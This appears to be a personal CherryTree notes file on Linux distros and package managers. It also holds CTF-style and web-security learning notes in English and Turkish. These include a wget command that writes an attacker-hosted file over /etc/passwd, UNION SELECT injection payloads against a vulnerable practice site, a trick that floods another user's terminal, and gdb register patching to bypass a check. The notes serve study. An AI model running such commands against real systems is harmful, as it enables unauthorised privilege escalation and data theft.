				<rich_text>ABOLUTE TOP PERFORMANCE
 </rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Manjaro" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586110829.75" ts_lastsave="1586110870.66" unique_id="184">
				<rich_text>Based on arch
rolling release is a nightmare, every update brings more bugs than it fixes.
Idk if manjaro has an LTS release.
the bleeding edge blade cuts both ways.</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Slax" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586110793.63" ts_lastsave="1586110793.63" unique_id="183">
				<rich_text>
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="Ubuntu and derivatives" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586110682.89" ts_lastsave="1586110722.02" unique_id="180">
				<rich_text>works well with games and game drivers.
pretty stable
</rich_text>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="File Managers" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586183875.29" ts_lastsave="1586183895.67" unique_id="196">
			<rich_text>
</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="dolphin" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586183880.71" ts_lastsave="1586183880.71" unique_id="198">
				<rich_text>
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="nautilus" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586183895.8" ts_lastsave="1586183916.37" unique_id="199">
				<rich_text>gnomes file manager yuck, reason i hate gnome</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="nemo" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586183878.54" ts_lastsave="1586183880.66" unique_id="197">
				<rich_text>
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="thunar" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586183916.43" ts_lastsave="1588354470.79" unique_id="200">
				<rich_text>pretty slick, BUT right clicking the folder ur in on detailed view is not possible</rich_text>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Package Managers &amp; Installing Software" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569047124.93" ts_lastsave="1586111050.0" unique_id="39">
			<rich_text>snapten uzak dur
</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="apt" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569047135.13" ts_lastsave="1590308725.93" unique_id="40">
				<rich_text>new front end for dpkg

apt is apt-get and apt-cache combined for the end users to make a better package manager
apt does not stand for APT (these naming schemes smh)

-WARNING: apt does not have a stable CLI interface. Use with caution in scripts.   
-WARNING2: apt yinede en iyisi gibi duruyor, ancak dependency nightmare gerceklesebilir

Commands:
apt list --installed                # lists all installed packages
apt download &lt;pkgname&gt;              # download pkg without dependencies.(it doesn't know which dependencies to download until you try to install it
apt install &lt;pkgname&gt;               # use ./ before the package name to install local packages. You can also install multiple packages with 1 install command (why would you ever use this)
apt search &lt;keyword&gt;                # searches the repositories that are listed in sources.list or sources.list.d
apt show &lt;pkgname&gt;                  # detailed info of package, pulled from repos.
apt cache
apt remove                          # remove a package.</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="apt-get" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586018802.17" ts_lastsave="1586019299.3" unique_id="167">
				<rich_text>apt in dedesi, cok daha fazla argumani var, less end-user friendly</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="aptitude" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586018795.14" ts_lastsave="1586269113.56" unique_id="166">
				<rich_text>better looking and functioning version of apt

gives clarity around dependencies &amp; conflicts
gives a GUI when used without arguments ( might need to have tasksel installed i ddidnt quite understand this part)
</rich_text>
				<node custom_icon_id="0" foreground="" is_bold="False" name="Commands" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586269113.68" ts_lastsave="1586269231.24" unique_id="237">
					<rich_text>&quot;aptitude&quot; prefix is applied to every sub command here</rich_text>
					<node custom_icon_id="0" foreground="" is_bold="False" name="autoclean" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586269790.47" ts_lastsave="1586269791.75" unique_id="255">
						<rich_text>doesnt need to be rebuilt with this.</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="clean" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586269745.09" ts_lastsave="1586269790.37" unique_id="254">
						<rich_text>clears out cache completely
needs to be rebuilt now -_- (update)
</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="full-upgrade" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586269272.27" ts_lastsave="1586269356.0" unique_id="242">
						<rich_text>will purge any unused packages
</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="hold gedit" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586269360.8" ts_lastsave="1586269463.25" unique_id="244">
						<rich_text>hold a package from updating
basically pinning from apt
</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="install gedit" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586269127.96" ts_lastsave="1586269129.73" unique_id="238">
						<rich_text>installs the package
</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="install gedit-" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586269143.05" ts_lastsave="1586269144.49" unique_id="239">
						<rich_text>removes gedit
</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="install gedit_" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586269152.25" ts_lastsave="1586269226.75" unique_id="240">
						<rich_text>purges gedit</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="keep" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586269463.34" ts_lastsave="1586269487.77" unique_id="246">
						<rich_text>dont use
use hold instead</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="safe-upgrade" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586269284.02" ts_lastsave="1586269438.09" unique_id="243">
						<rich_text>wont purge any unused packages</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="search gedit" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586269487.86" ts_lastsave="1586269519.93" unique_id="247">
						<rich_text>
</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="search ~ahold" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586269600.11" ts_lastsave="1586269627.94" unique_id="250">
						<rich_text>searches local held packages</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="search ~b" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586269583.81" ts_lastsave="1586269600.05" unique_id="249">
						<rich_text>searches for broken packages in the system
</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="search ~igedit" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586269520.01" ts_lastsave="1586269578.01" unique_id="248">
						<rich_text>search the system for installed gedit packages
A represents installed
B is broken
H is half installed
no letter is ok
</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="show gedit" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586269628.01" ts_lastsave="1586269670.55" unique_id="251">
						<rich_text>shows package information
version etc</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="unhold gedit" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586269394.6" ts_lastsave="1586269420.66" unique_id="245">
						<rich_text>dont hold the package for updating versions</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="update " prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586269226.83" ts_lastsave="1586269272.18" unique_id="241">
						<rich_text>
</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="why gedit" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586269670.64" ts_lastsave="1586269683.68" unique_id="252">
						<rich_text>what is missing for gedit to properly install
 </rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="why-not" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586269717.6" ts_lastsave="1586269744.98" unique_id="253">
						<rich_text>displays conflicts</rich_text>
					</node>
				</node>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="checkinstall" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586018929.85" ts_lastsave="1586018930.7" unique_id="170">
				<rich_text>DONT:
./configure
make
make install
make clean

DO:
tar -zxvf source-app.tar.gz
cd source
./configure
make
checkinstall

if you have a tarball to install STOP AND MAKE THAT A deb PACKAGE. Otherwise uninstalling might be a pain.
This is where the software 'checkinstall' comes in very handy!
</rich_text>
				<rich_text link="webs http://checkinstall.izto.org/index.php">http://checkinstall.izto.org/index.php</rich_text>
				<rich_text>
This technique is from 2010, 2014</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="cube" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1585920811.83" ts_lastsave="1586019017.08" unique_id="162">
				<rich_text>download packages from normal repos
keep them
install whenever
very portable (download on windows, transfer &amp; install on linux type of portable)

uses apt-get or dpkg in the background
which means u dont need the cube ui really LUL

u cannot run cube with root, which -is- was default on kali.


</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="dpkg" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570861526.3" ts_lastsave="1586019208.15" unique_id="104">
				<rich_text>debian package manager

WARNING: apparently installing a .deb file with dpkg &quot;may&quot; break dependencies
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="gdebi" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586019151.04" ts_lastsave="1586019194.2" unique_id="171">
				<rich_text>gui

-solves (solves how?) dependency issues
-if that g represents gnome i swear ill shit on this software for even if its perfect
-uses apt and dpkg simultaneously</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="homebrew" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586018871.65" ts_lastsave="1586018879.5" unique_id="169">
				<rich_text>Mac's og package manager (?)

</rich_text>
				<rich_text link="webs https://github.com/Homebrew/legacy-homebrew">https://github.com/Homebrew/legacy-homebrew</rich_text>
				<rich_text>
</rich_text>
				<rich_text link="webs https://github.com/Homebrew/homebrew-core">https://github.com/Homebrew/homebrew-core</rich_text>
				<rich_text>
</rich_text>
				<rich_text link="webs https://github.com/Homebrew/brew">https://github.com/Homebrew/brew</rich_text>
				<rich_text>
</rich_text>
				<rich_text link="webs https://www.quora.com/Is-there-a-package-manager-for-Linux-that-is-similar-to-Homebrew-for-Mac-1">https://www.quora.com/Is-there-a-package-manager-for-Linux-that-is-similar-to-Homebrew-for-Mac-1</rich_text>
				<rich_text>
</rich_text>
				<rich_text link="webs https://formulae.brew.sh/">https://formulae.brew.sh/</rich_text>
				<rich_text>
</rich_text>
				<rich_text link="webs https://brew.sh/">https://brew.sh/</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="local apt-get repository" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586019228.29" ts_lastsave="1586019257.99" unique_id="172">
				<rich_text>multiple packages? (like 50 for vlc?)
USE THIS.

 </rich_text>
				<rich_text link="webs https://sites.google.com/site/debianpackagemanagement/setting-local-repository">https://sites.google.com/site/debianpackagemanagement/setting-local-repository</rich_text>
				<rich_text>
 i have the website archived somewher</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="pacman" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569058910.34" ts_lastsave="1586111019.23" unique_id="49">
				<rich_text>default of </rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="snap" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586377647.28" ts_lastsave="1586377807.9" unique_id="258">
				<rich_text>dont forget to disable snaps connections</rich_text>
				<node custom_icon_id="0" foreground="" is_bold="False" name="Commands" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586377687.46" ts_lastsave="1586378011.51" unique_id="259">
					<rich_text>
</rich_text>
					<node custom_icon_id="0" foreground="" is_bold="False" name="disable" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586378270.77" ts_lastsave="1586378275.14" unique_id="266">
						<rich_text>this is like temporarily deleting a pkg</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="enable" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586378272.63" ts_lastsave="1586378307.5" unique_id="267">
						<rich_text>enables disabled pkg</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="info &lt;pkgname&gt;" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586377698.1" ts_lastsave="1586377789.35" unique_id="260">
						<rich_text>
</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="install &lt;pkgname&gt;" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586377789.42" ts_lastsave="1586381772.98" unique_id="261">
						<rich_text>local pkg installation:

thmyris@supersecretpc:~$ snap download notepadqq
Fetching snap &quot;notepadqq&quot;
Fetching assertions for &quot;notepadqq&quot;
Install the snap with:
   snap ack notepadqq_855.assert
   snap install notepadqq_855.snap

here is sudo added:
sudo snap ack notepadqq_855.assert
sudo snap install notepadqq_855.snap</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="list" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586378011.59" ts_lastsave="1586378095.32" unique_id="263">
						<rich_text>lists all installed snap packages on the system</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="refresh &lt;pkgname&gt;" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586378095.39" ts_lastsave="1586378130.93" unique_id="264">
						<rich_text>updates package from snap store</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="remove" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586378307.58" ts_lastsave="1586378317.16" unique_id="268">
						<rich_text>By default, all of a snap’s revisions are also removed. To remove a specific revision, add the </rich_text>
						<rich_text family="monospace">--revision=&lt;revision-number&gt;</rich_text>
						<rich_text> argument to the remove command.</rich_text>
					</node>
					<node custom_icon_id="0" foreground="" is_bold="False" name="revert &lt;pkgname&gt;" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586378131.01" ts_lastsave="1586378270.69" unique_id="265">
						<rich_text>This operation will revert both the snap revision and the data  associated with the software. If the previously used revision of the  snap is from a different channel, that snap will be installed but the  channel being tracked won’t change.
A snap won’t automatically update to a version previously reverted from, and the output from </rich_text>
						<rich_text family="monospace">snap refresh</rich_text>
						<rich_text> will continue to state All snaps up to date. A reverted snap will be automatically updated when a new and different revision is made available by the publisher.
However, explicitly adding the snap name to </rich_text>
						<rich_text family="monospace">snap refresh</rich_text>
						<rich_text> will update the snap, regardless of whether the latest revision was previously reverted from or not:
</rich_text>
					</node>
				</node>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="snap" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570861536.15" ts_lastsave="1570861536.71" unique_id="105">
				<rich_text>its a shit
:&gt;</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="synaptics manager" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586018834.07" ts_lastsave="1586018837.77" unique_id="168">
				<rich_text>gui for apt</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="yum" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586111050.06" ts_lastsave="1586111050.06" unique_id="186">
				<rich_text>
</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="zypper" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586111036.67" ts_lastsave="1586111036.67" unique_id="185">
				<rich_text>
</rich_text>
			</node>
		</node>
	</node>
	<node custom_icon_id="12" foreground="" is_bold="False" name="what this file is not" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1578934079.35" ts_lastsave="1589428022.27" unique_id="142">
		<rich_text>this is a personal documentation
anything that is out of my scope will mostly not be covered here.
if I had no interest before I'll have no interest in the future.</rich_text>
	</node>
	<node custom_icon_id="15" foreground="" is_bold="False" name="read &amp; integrate" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1578933042.78" ts_lastsave="1590021246.87" unique_id="133">
		<rich_text>
</rich_text>
		<node custom_icon_id="0" foreground="" is_bold="False" name="rlwrap &lt;bashcommand&gt;" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1578933095.84" ts_lastsave="1578933099.84" unique_id="134">
			<rich_text>lets you press the up arrow, remebers ur commands

from ippsec
</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="hostnamectl" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586614757.11" ts_lastsave="1587637608.71" unique_id="292">
			<rich_text>i used this i hope it doesnt come bite me in the ass

</rich_text>
			<rich_text scale="h2">Ubuntu Linux Change Hostname Using hostnamectl</rich_text>
			<rich_text>
Systemd based Linux distro such as Ubuntu Linux 16.04 LTS and above can simply use the hostnamectl command to change hostname. To see current setting just type the following command:
</rich_text>
			<rich_text family="monospace">$ hostnamectl</rich_text>
			<rich_text>
Sample outputs:
</rich_text>
			<rich_text justification="left"></rich_text>
			<rich_text>
To change hostname from nixcraft to viveks-laptop, enter:
</rich_text>
			<rich_text family="monospace">$ hostnamectl set-hostname viveks-laptop
$ hostnamectl</rich_text>
			<rich_text>

it did bite me in the ass, i also had to change the hosts file iirc</rich_text>
			<codebox char_offset="314" frame_height="150" frame_width="300" highlight_brackets="False" show_line_numbers="False" syntax_highlighting="plain-text" width_in_pixels="True">Static hostname: nixcraft         Icon name: computer-laptop           Chassis: laptop        Machine ID: 291893e6499e4d99891c3cf4b70a138b           Boot ID: 9fda2365b77841649e40a141fde46537  Operating System: Ubuntu 17.10            Kernel: Linux 4.13.0-21-generic      Architecture: x86-64</codebox>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="grub customizer" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1586437008.9" ts_lastsave="1587736845.7" unique_id="280">
			<rich_text>
</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="optional stream notes" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587504900.41" ts_lastsave="1588345077.63" unique_id="438">
			<rich_text>echo cat devurandom &gt; pts/0
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
dont forget to remove any spaces before the rsa key
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
koth; sshd_config i degistir systemctl restart sshd
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
website/.git/logs/HEAD to give you leads
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
joplin
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
wappalyzer
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
vscode is sweet would help you writing code as well on screen terminal deirect ssh/ftp connection and so much more
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
screen 4.5 exploit

</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="keepnote" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588345077.88" ts_lastsave="1588345078.3" unique_id="467">
			<rich_text link="webs http://keepnote.org/index.shtml#download">http://keepnote.org/index.shtml#download</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="ctrl + b" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588353073.36" ts_lastsave="1589750795.39" unique_id="470">
			<rich_text>bold
</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="alt + &lt;-, -&gt; " prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588352775.77" ts_lastsave="1588353073.11" unique_id="469">
			<rich_text>in cherrytree
to navigate between most recent 3 nodes
</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="php has /uploads in subfodlers " prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589700956.44" ts_lastsave="1589700959.83" unique_id="501">
			<rich_text link="webs http://10.10.80.139:3333/internal/uploads/">http://10.10.80.139:3333/internal/uploads/</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="eternalblue explained" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589751625.55" ts_lastsave="1589751625.55" unique_id="502">
			<rich_text>
</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="{sam_database_elevated_access}" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589757951.26" ts_lastsave="1589757952.84" unique_id="511">
			<rich_text>found in blue flag2.txt</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="jh thm wget" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589775405.02" ts_lastsave="1589775779.53" unique_id="528">
			<rich_text>#!/bin/python3
import crypt
crypt.crypt(&quot;plzsub&quot;)

host file with python -m http.server
creates a server on curr folder
you can download from a remote host with: wget </rich_text>
			<rich_text link="webs http://LOCALIP:8000/filename">http://LOCALIP:8000/filename</rich_text>
			<rich_text> -O /etc/passwd</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="yes y" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1589938166.12" ts_lastsave="1589938166.55" unique_id="568">
			<rich_text>yes y | commandthatneeds y/n

does this work?</rich_text>
		</node>
	</node>
	<node custom_icon_id="0" foreground="" is_bold="False" name="Not yet integrated lecture notes:" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1590021247.2" ts_lastsave="1591394265.99" unique_id="573">
		<rich_text></rich_text>
		<node custom_icon_id="0" foreground="" is_bold="False" name="MDI WebSec 0x01: SQLi" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1590011992.06" ts_lastsave="1592501715.46" unique_id="570">
			<rich_text>Izleme tarihim: 21.05.2020 (22deki olasilik vizesini cani ceh xD)
Link: </rich_text>
			<rich_text link="webs https://www.twitch.tv/videos/595111162">https://www.twitch.tv/videos/595111162</rich_text>
			<rich_text> , </rich_text>
			<rich_text link="webs https://youtu.be/WtHnT73NaaQ">https://youtu.be/WtHnT73NaaQ</rich_text>
			<rich_text>
Video Ismi: Highlight: Web Security 101 0x01 - SQL Injection'ı Bütünüyle Anlamak
</rich_text>
			<node custom_icon_id="0" foreground="" is_bold="False" name="0. Giris" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1590020901.02" ts_lastsave="1592515983.84" unique_id="572">
				<rich_text>mysql ile calisicaz.

sudo -i
/etc/init.d/mysql start
mysql -u root -p
(enter empty)


SELECT 1; ne verir?
sonuc? hata? bos sonuc?
1 kolonunda 1 dondurur.

SELECT 2-1;
2-1 kolonunda 1 dondurur.
Kolon ismi direk aldigi input, sonuc hesaplama sonrasi elde edilen sey

SELECT 2+1;
3

SELECT '2-1';
2-1 kolonunda 2-1 dondurur (string)

SELECT '2'-'1';
1
mysql burda string den string cikarmaya calistigini goruyor, bunu integera castleyebilecegini farkediyor, castleyip islem yapiyor.

SELECT '2'+'1';
3

SELECT '2'+'a';
2
mysql burda 2yi integera castliyor, a yi castleyemiyor 0 aliyor.

SELECT 'b'+'a';
0

SELECT '2' '1';
21

sununla ayni sey:
SELECT concat('2','1');
21
Yani &quot;bosluk = concatanation&quot;. Bosluk koymadan yazinca 2'1 donduruyor.

Virgul koyunca ayri sekmelerde ayri sonuclar donuyor.
SELECT '2','2-1'
2 | 1

SELECT '2' '1' 'a';
21a

SELECT '2' '1' 'a'-1;
20
Burda 'a'-1 zaten 0-1 = -1. Burda 21-1 yapiyor, string olarak yazdigi 21i typecastleyip int 21-1 e ceviriyor.

SELECT 2^1;
3
??? 

SELECT 2^2;
0
:D XOR bu, binary 0001 ^ 0010 = 0011 = 3

SELECT !1;
0
NOT isareti bu

SELECT ~1;
18446744073709551614
max int - 1 yazdirir.

Bunlar diger sql lerde tamamen farkli calisabiliyor, mesela oracle da from yazmadan calismaz bunlar. Dolayisiyla oracle'da select query from dual; ile yazilir.

create database test;
use test;
CREATE TABLE users (
id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
firstname VARCHAR(30) NOT NULL,
lastname VARCHAR(30) NOT NULL
);

INSERT INTO users (firstname, lastname) VALUES ('mehmet', 'ince');  
INSERT INTO users (firstname, lastname) VALUES ('mehmet ', 'ince');  
INSERT INTO users (firstname, lastname) VALUES ('mehmet  ', 'ince');  
INSERT INTO users (firstname, lastname) VALUES ('mehmet    ', 'ince');  
INSERT INTO users (firstname, lastname) VALUES ('mehmet     .', 'ince');  
select * from users where firstname = 'mehmet';
Bu noktasiz tum mehmetleri donduruyor, sonlarindaki boslugu trimliyor.

bunun guv've etkisi su: admin diye bir girdi var mesela, 'admin ' diye girdi aciyorsun, id kontrolu yaparken 2sini de dondurcek. Parolani sifirlamaya calistiginda tum admin girdilerinin sifresi degisecek. gg.

EXACT match yapinca boyle bir sorun olmuyormus. O da WHERE'den sonra BINARY yazmakla oluyor.
select * from users where BINARY firstname = 'mehmet';</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="1. sqli ornek" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1590020312.18" ts_lastsave="1592516489.86" unique_id="571">
				<rich_text>                FRONTEND

</rich_text>
				<rich_text link="webs http://www.x.com/?id=1">www.x.com/?id=1</rich_text>
				<rich_text>

backend: Select * from haberler where id = 1

#http response:
&lt;html&gt;
MDISEC
&lt;/html&gt;

</rich_text>
				<rich_text link="webs http://www.x.com/?id=">www.x.com/?id=</rich_text>
				<rich_text> 2-1
backend: Select * from haberler where id = 2-1

response:
&lt;html&gt;
MDISEC
&lt;/html&gt;
    
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                BACKEND

id = request.get('id')

query = &quot;select * from haberler where id = &quot;+id&quot;

result = db.execute(query)

if result.size() &gt; 0:               # veri dondu
    for i in result:
        print(i.title)
else:
    print(&quot;haber yok&quot;)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

SQL icin bug bountylerde guzel bir teknik kendine bir referans noktasi belirleyip o noktaya geri donmeye calismak. Burda MDISEC aldik ya, don dolas bunu farkli yollarla elde etmeye calis.

burda 'OR AND falan denemek tamamen vakit kaybi gunumuzde. Baska yollar gerekiyor. Nerdeyse her sqli UNION kullaniyor. Ama union in bir limiti var o da ilk querydeki kolon sayisinin sub querydeki kolon sayisiyla </rich_text>
				<rich_text underline="single">esit</rich_text>
				<rich_text> olmasi gerekiyor.














</rich_text>
			</node>
			<node custom_icon_id="0" foreground="" is_bold="False" name="2. site ornegi" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1590021436.27" ts_lastsave="1592501662.63" unique_id="574">
				<rich_text>testphp.vulnweb.com/categories.php
browse categories, Posters a tikladik
testphp.vulnweb.com/listproducts.php?cat=1

Bir kere bu linki goren, products tablosundan select ile secilen kategorinin nizami bir sekilde gelecegini gormeli. Productlarla kategoriler arasinda bir menu2menu relation olur. Dolayisiyla bir join sorgusu var, bu linkteki category de muhtemelen kategori tablosundaki id'ye tekabul ediyor.

testphp.vulnweb.com/listproducts.php?cat=1 UNION SELECT 2-1
hata aldin, hic bilgi almayadabilirdin alttaki try exception blogu konmus olsaydi.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                BACKEND

id = request.get('id')

query = &quot;select * from haberler where id = &quot;+id&quot;

try 
    result = db.execute(query)

except Exception as e:
    pass

if result.size() &gt; 0: #veri dondu
    for i in result:
        print(i.title)
else:
    print(&quot;haber yok&quot;)        

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Sorun su, biz ref noktamiza geri donemedik. Dolayisiyla bu hatadan kurtulana kadar, yani union icin kolonlar esitlenene kadar kolon sayisini artiricaz.

testphp.vulnweb.com/listproducts.php?cat=1 UNION SELECT 2-1,1,2,3,4,5,6,7,8,9,10,11

11e kadar denedim, 11de acti sayfayi. Heh, tamam ref noktamiza donduk. Simdi elimizde kolon sayisi bilgisi var. 
Ancak dikkat edilirse 11e kadar cikarak getirdigimiz sayfa biraz farkli, 7 diye bir post var en altta.
ne demek bu?
</rich_text>
				<rich_text justification="left"></rich_text>
				<rich_text>
Normalde boyle bir sonuc cikmamasi lazim, ek bilgi versin diye siteye kodlanmis gibi. Su demek, uygulama vtnin 7.kolonundan title, 2. kolonundan content 9. kolonundan yazar verisi cekiyor. Dolayisiyla bu sorgularda mesela 7.kolona version() yazarsan versiyon verisi dondurecek.
Bizim injectiondan onceki select sorgusunun 2. 7. 9. kolonlarindan cekiliyor bu bilgi yani.







</rich_text>
				<encoded_png char_offset="1375"></encoded_png>
			</node>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="Liveoverflow - Binary Exploitation" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1591394266.14" ts_lastsave="1591397975.16" unique_id="283">
			<rich_text>0x05
disassemble main
it looks complicated but you can ignore most of it.
You dont have to go line by line, main calls a lot of functions, we dont need them.
Make a flowchart of important addresses and the stuff they do.

break *main
run
info registers
si  # step one instruction
# si would step into function calls, we dont want to follow stuff like puts, so use ni
ni
# to repeat the last command press ENTER
while jumping around notice the addresses its going to, and compare
break *ADRESS  # yapip continue dersek buraya gelene kadar devam ediyor program
# test eax in oraya breakpoint koyuyoruz
EAX refers to the first (rightmost) 32 bits of the 64 bit RAX register.
info registers

eax 0 dondururse dogru olmus oluyor. 
o zaman
set $eax=0

